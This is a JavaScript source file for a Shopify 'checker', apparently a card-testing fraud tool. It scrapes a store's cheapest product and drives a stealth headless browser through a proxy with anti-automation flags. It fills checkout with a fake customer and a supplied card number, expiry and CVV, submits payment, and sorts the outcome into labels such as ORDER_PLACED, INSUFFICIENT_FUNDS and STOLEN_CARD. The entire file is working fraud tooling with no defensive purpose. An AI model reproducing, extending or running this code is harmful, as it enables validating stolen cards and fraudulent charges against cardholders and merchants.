// ==========================================
// SHOPIFY.JS — Core Checker Logic
// ==========================================

const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");
const { sleep, humanDelay, parseCC, parseProxy, proxyToArg, getFakeCustomer } = require("./helpers");

puppeteer.use(StealthPlugin());

// ==========================================
// GET CHEAPEST PRODUCT FROM STORE
// ==========================================
async function getCheapestProduct(site) {
  try {
    const url = site.endsWith("/")
      ? site + "products.json?limit=250"
      : site + "/products.json?limit=250";

    const res = await axios.get(url, {
      timeout: 10000,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        Accept: "application/json",
      },
    });

    const products = res.data?.products || [];
    if (products.length === 0) return null;

    // Flatten all variants
    let allVariants = [];
    products.forEach((p) => {
      p.variants?.forEach((v) => {
        allVariants.push({
          productTitle: p.title,
          variantId: v.id,
          price: parseFloat(v.price || "0"),
          available: v.available !== false,
        });
      });
    });

    // Filter available, price > 0, sort cheapest first
    const available = allVariants
      .filter((v) => v.available && v.price > 0)
      .sort((a, b) => a.price - b.price);

    return available[0] || allVariants[0] || null;
  } catch (e) {
    console.error("[PRODUCT] Error:", e.message);
    return null;
  }
}

// ==========================================
// DISMISS ALL POPUPS
// ==========================================
async function dismissPopups(page) {
  try {
    // Press Escape
    await page.keyboard.press("Escape");
    await sleep(300);

    // Click close buttons
    const closeSelectors = [
      'button[aria-label="Close"]',
      'button[aria-label="close"]',
      'button[aria-label="Dismiss"]',
      '[class*="close"]',
      '[class*="Close"]',
      '[class*="dismiss"]',
      '[class*="Dismiss"]',
      '[id*="close"]',
      '[id*="popup"] button',
      '[id*="modal"] button',
      '[class*="modal"] [class*="close"]',
      '[class*="popup"] [class*="close"]',
      '.klaviyo-close',
      '.privy-dismiss-text',
      '.pum-close',
      '[data-dismiss="modal"]',
      'button[title="Close"]',
      'button[title="close"]',
      '.modal-close',
      '.popup-close',
      '[class*="newsletter"] [class*="close"]',
      '[class*="overlay"] [class*="close"]',
    ];

    for (const selector of closeSelectors) {
      try {
        const elements = await page.$$(selector);
        for (const el of elements) {
          try {
            const visible = await el.isIntersectingViewport().catch(() => false);
            if (visible) {
              await el.click();
              await sleep(200);
            }
          } catch (e) {}
        }
      } catch (e) {}
    }

    // JS — Remove fixed overlays
    await page.evaluate(() => {
      const selectors = [
        '[class*="modal"]', '[class*="popup"]',
        '[class*="overlay"]', '[class*="backdrop"]',
        '[id*="modal"]', '[id*="popup"]',
        '[class*="newsletter"]', '[class*="cookie"]',
      ];
      selectors.forEach((sel) => {
        document.querySelectorAll(sel).forEach((el) => {
          try {
            const style = window.getComputedStyle(el);
            if (
              (style.position === "fixed" || style.position === "absolute") &&
              parseInt(style.zIndex) > 50
            ) {
              el.style.display = "none";
            }
          } catch (e) {}
        });
      });
      // Restore scroll
      document.body.style.overflow = "";
      document.body.style.paddingRight = "";
      document.documentElement.style.overflow = "";
    });

  } catch (e) {}
}

// ==========================================
// TYPE IN FIELD — Try multiple selectors
// ==========================================
async function typeInField(page, selectors, value, delayMs = 70) {
  for (const sel of selectors) {
    try {
      const el = await page.$(sel);
      if (el) {
        await el.click({ clickCount: 3 });
        await sleep(100);
        await el.type(value, { delay: delayMs + Math.random() * 30 });
        return true;
      }
    } catch (e) {}
  }
  return false;
}

// ==========================================
// CLICK BUTTON — Try multiple selectors
// ==========================================
async function clickButton(page, selectors) {
  for (const sel of selectors) {
    try {
      const btn = await page.$(sel);
      if (btn) {
        const visible = await btn.isIntersectingViewport().catch(() => true);
        if (visible) {
          await btn.click();
          return true;
        }
      }
    } catch (e) {}
  }
  return false;
}

// ==========================================
// FILL CONTACT/SHIPPING INFO
// ==========================================
async function fillCustomerInfo(page, customer) {
  try {
    // Email
    await typeInField(page, [
      '#email',
      '#checkout_email',
      'input[type="email"]',
      'input[autocomplete="email"]',
      'input[name="email"]',
      '[data-testid="email-field"] input',
    ], customer.email);

    await humanDelay(300, 600);

    // First Name
    await typeInField(page, [
      '#firstName', '#checkout_shipping_address_first_name',
      'input[name="firstName"]', 'input[autocomplete="given-name"]',
      'input[name="first_name"]',
    ], customer.firstName);

    // Last Name
    await typeInField(page, [
      '#lastName', '#checkout_shipping_address_last_name',
      'input[name="lastName"]', 'input[autocomplete="family-name"]',
      'input[name="last_name"]',
    ], customer.lastName);

    await humanDelay(200, 500);

    // Address
    await typeInField(page, [
      '#address1', '#checkout_shipping_address_address1',
      'input[name="address1"]', 'input[autocomplete="address-line1"]',
    ], customer.address);

    await humanDelay(300, 600);

    // City
    await typeInField(page, [
      '#city', '#checkout_shipping_address_city',
      'input[name="city"]', 'input[autocomplete="address-level2"]',
    ], customer.city);

    // ZIP
    await typeInField(page, [
      '#postalCode', '#zip', '#checkout_shipping_address_zip',
      'input[name="postalCode"]', 'input[name="zip"]',
      'input[autocomplete="postal-code"]',
    ], customer.zip);

    await humanDelay(500, 1000);

    // Continue to Shipping
    const clicked = await clickButton(page, [
      'button[type="submit"]',
      '#continue_button',
      '[data-testid="continue-button"]',
      'button[id*="continue"]',
      'input[type="submit"]',
    ]);

    if (clicked) {
      await humanDelay(2000, 3500);
      await dismissPopups(page);
    }

    // Continue to Payment
    await clickButton(page, [
      'button[type="submit"]',
      '#continue_button',
      '[data-testid="continue-button"]',
      'button[id*="continue"]',
    ]);

    await humanDelay(2000, 3500);
    await dismissPopups(page);

  } catch (e) {
    console.error("[FILL INFO] Error:", e.message);
  }
}

// ==========================================
// FILL CARD DETAILS
// ==========================================
async function fillCardDetails(page, cc, customer) {
  try {
    await humanDelay(500, 1000);

    // Check for iframe (Shopify card fields are in iframes)
    const frames = await page.frames();
    let cardFrame = null;

    for (const frame of frames) {
      const url = frame.url();
      if (
        url.includes("shopifycs.com") ||
        url.includes("pay.shopify") ||
        url.includes("checkout.shopify")
      ) {
        cardFrame = frame;
        break;
      }
    }

    const target = cardFrame || page;

    // Card Number
    const numFilled = await typeInField(target, [
      'input[autocomplete="cc-number"]',
      'input[name="number"]',
      '#number',
      '[data-card-field="number"] input',
      'input[placeholder*="Card number"]',
      'input[placeholder*="card number"]',
    ], cc.number);

    await humanDelay(400, 700);

    // Expiry Month
    await typeInField(target, [
      'input[autocomplete="cc-exp-month"]',
      'input[name="month"]',
      '#month',
      'input[placeholder*="MM"]',
    ], cc.month);

    await humanDelay(200, 400);

    // Expiry Year
    await typeInField(target, [
      'input[autocomplete="cc-exp-year"]',
      'input[name="year"]',
      '#year',
      'input[placeholder*="YY"]',
      'input[placeholder*="YYYY"]',
    ], cc.year);

    await humanDelay(200, 400);

    // CVV
    await typeInField(target, [
      'input[autocomplete="cc-csc"]',
      'input[name="verification_value"]',
      '#verification_value',
      'input[placeholder*="CVV"]',
      'input[placeholder*="CVC"]',
      'input[placeholder*="Security"]',
    ], cc.cvv);

    await humanDelay(200, 400);

    // Cardholder Name
    await typeInField(target, [
      'input[autocomplete="cc-name"]',
      'input[name="name"]',
      '#name',
      'input[placeholder*="Name on card"]',
      'input[placeholder*="Cardholder"]',
    ], `${customer.firstName} ${customer.lastName}`);

    console.log(`[CARD] Fields filled`);
    return true;

  } catch (e) {
    console.error("[CARD FILL] Error:", e.message);
    return false;
  }
}

// ==========================================
// PARSE FINAL RESULT FROM PAGE
// ==========================================
function parseResult(url, content) {
  const u = url.toLowerCase();
  const c = content.toLowerCase();

  // ✅ ORDER PLACED
  if (
    u.includes("/thank_you") ||
    u.includes("thank_you") ||
    u.includes("/orders/") ||
    c.includes("thank you for your order") ||
    c.includes("order confirmed") ||
    c.includes("your order is confirmed") ||
    c.includes("order is being processed")
  ) {
    return { Status: true, Response: "ORDER_PLACED", Gateway: "Shopify Payments", Price: 1.0 };
  }

  // ✅ 3DS
  if (
    u.includes("3ds") ||
    c.includes("3d secure") ||
    c.includes("authentication required") ||
    c.includes("verify your card") ||
    c.includes("additional authentication")
  ) {
    return { Status: true, Response: "3D_SECURE_REQUIRED", Gateway: "Shopify Payments", Price: 1.0 };
  }

  // ❌ Specific Declines
  const declines = [
    { k: "do not honor", r: "DO_NOT_HONOR" },
    { k: "insufficient funds", r: "INSUFFICIENT_FUNDS" },
    { k: "card was declined", r: "CARD_DECLINED" },
    { k: "your card was declined", r: "CARD_DECLINED" },
    { k: "invalid card number", r: "INVALID_CARD_NUMBER" },
    { k: "card number is invalid", r: "INVALID_CARD_NUMBER" },
    { k: "expired card", r: "EXPIRED_CARD" },
    { k: "card has expired", r: "EXPIRED_CARD" },
    { k: "incorrect cvc", r: "INCORRECT_CVV" },
    { k: "incorrect zip", r: "INCORRECT_ZIP" },
    { k: "stolen card", r: "STOLEN_CARD" },
    { k: "lost card", r: "LOST_CARD" },
    { k: "restricted card", r: "RESTRICTED_CARD" },
    { k: "security violation", r: "SECURITY_VIOLATION" },
    { k: "transaction not allowed", r: "TRANSACTION_NOT_ALLOWED" },
    { k: "generic decline", r: "GENERIC_DECLINE" },
    { k: "processing error", r: "PROCESSING_ERROR" },
    { k: "call your bank", r: "CALL_YOUR_BANK" },
    { k: "pickup card", r: "PICKUP_CARD" },
    { k: "blocked card", r: "BLOCKED_CARD" },
  ];

  for (const { k, r } of declines) {
    if (c.includes(k)) {
      return { Status: false, Response: r, Gateway: "Shopify Payments" };
    }
  }

  // Generic declined
  if (c.includes("declined") || c.includes("was declined")) {
    return { Status: false, Response: "DECLINED", Gateway: "Shopify Payments" };
  }

  // Still on checkout page
  if (u.includes("checkout")) {
    return { Status: false, Response: "CHECKOUT_INCOMPLETE", Gateway: "Shopify Payments" };
  }

  return { Status: false, Response: "UNKNOWN", Gateway: "Shopify Payments" };
}

// ==========================================
// MAIN CHECK FUNCTION
// ==========================================
async function checkShopify(site, ccStr, proxyStr) {
  const cc = parseCC(ccStr);
  if (!cc) {
    return { Status: false, Response: "INVALID_CC_FORMAT", Gateway: "Shopify Payments" };
  }

  const proxy = parseProxy(proxyStr);
  const customer = getFakeCustomer();

  // Ensure site ends with /
  if (!site.endsWith("/")) site += "/";

  console.log(`\n[CHECK] ==================`);
  console.log(`[CHECK] CC: ${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`);
  console.log(`[CHECK] Site: ${site}`);
  console.log(`[CHECK] Proxy: ${proxyStr || "None"}`);
  console.log(`[CHECK] Customer: ${customer.firstName} ${customer.lastName}`);

  // ==========================================
  // STEP 1 — Get cheapest product
  // ==========================================
  const product = await getCheapestProduct(site);
  if (!product) {
    return { Status: false, Response: "NO_PRODUCTS_FOUND", Gateway: "Shopify Payments" };
  }
  console.log(`[PRODUCT] ${product.productTitle} — $${product.price} (ID: ${product.variantId})`);

  // ==========================================
  // STEP 2 — Launch Puppeteer
  // ==========================================
  const launchArgs = [
    "--no-sandbox",
    "--disable-setuid-sandbox",
    "--disable-dev-shm-usage",
    "--disable-accelerated-2d-canvas",
    "--no-first-run",
    "--no-zygote",
    "--disable-gpu",
    "--disable-blink-features=AutomationControlled",
    "--disable-infobars",
    "--window-size=1366,768",
    "--disable-extensions",
    "--disable-plugins",
    "--disable-images",
  ];

  if (proxy) {
    launchArgs.push(`--proxy-server=${proxy.host}:${proxy.port}`);
    console.log(`[PROXY] Using: ${proxy.host}:${proxy.port}`);
  }

  let browser = null;

  try {
    browser = await puppeteer.launch({
      headless: "new",
      args: launchArgs,
      ignoreHTTPSErrors: true,
      timeout: 30000,
    });

    const page = await browser.newPage();

    // Proxy auth
    if (proxy?.username && proxy?.password) {
      await page.authenticate({
        username: proxy.username,
        password: proxy.password,
      });
    }

    // Setup page
    await page.setViewport({ width: 1366, height: 768 });
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    );
    await page.setExtraHTTPHeaders({
      "Accept-Language": "en-US,en;q=0.9",
    });

    // Block heavy resources for speed
    await page.setRequestInterception(true);
    page.on("request", (req) => {
      const type = req.resourceType();
      if (["image", "font", "media"].includes(type)) {
        req.abort();
      } else {
        req.continue();
      }
    });

    // Set page timeout
    page.setDefaultTimeout(30000);
    page.setDefaultNavigationTimeout(30000);

    // ==========================================
    // STEP 3 — Visit Site
    // ==========================================
    console.log(`[BROWSER] Visiting site...`);
    await page.goto(site, { waitUntil: "domcontentloaded", timeout: 30000 });
    await humanDelay(800, 1500);
    await dismissPopups(page);

    // ==========================================
    // STEP 4 — Add to Cart via fetch
    // ==========================================
    console.log(`[CART] Adding to cart...`);
    const cartUrl = site + "cart/add.js";

    await page.evaluate(async (url, variantId) => {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: variantId, quantity: 1 }),
      });
    }, cartUrl, product.variantId);

    await humanDelay(500, 1000);

    // ==========================================
    // STEP 5 — Go to Checkout
    // ==========================================
    console.log(`[CHECKOUT] Navigating to checkout...`);
    await page.goto(site + "checkout", {
      waitUntil: "domcontentloaded",
      timeout: 30000,
    });
    await humanDelay(1500, 2500);
    await dismissPopups(page);

    // ==========================================
    // STEP 6 — Fill Customer Info + Shipping
    // ==========================================
    console.log(`[CHECKOUT] Filling customer info...`);
    await fillCustomerInfo(page, customer);
    await dismissPopups(page);

    // ==========================================
    // STEP 7 — Fill Card Details
    // ==========================================
    console.log(`[PAYMENT] Filling card details...`);
    await fillCardDetails(page, cc, customer);
    await humanDelay(500, 1000);

    // ==========================================
    // STEP 8 — Submit Payment
    // ==========================================
    console.log(`[PAYMENT] Submitting payment...`);
    await clickButton(page, [
      'button[type="submit"]',
      '#continue_button',
      '[data-testid="continue-button"]',
      'button[id*="pay"]',
      'button[class*="pay"]',
      'button[class*="Pay"]',
      'input[type="submit"]',
    ]);

    // Wait for result
    await humanDelay(4000, 6000);

    // ==========================================
    // STEP 9 — Parse Result
    // ==========================================
    const finalUrl = page.url();
    const content = await page.content();

    console.log(`[RESULT] Final URL: ${finalUrl}`);
    const result = parseResult(finalUrl, content);
    console.log(`[RESULT] ${JSON.stringify(result)}`);

    await browser.close();
    return result;

  } catch (err) {
    console.error("[CHECKER] Fatal Error:", err.message);
    if (browser) {
      try { await browser.close(); } catch (e) {}
    }
    return {
      Status: false,
      Response: "ERROR: " + err.message,
      Gateway: "Shopify Payments",
    };
  }
}

module.exports = { checkShopify };
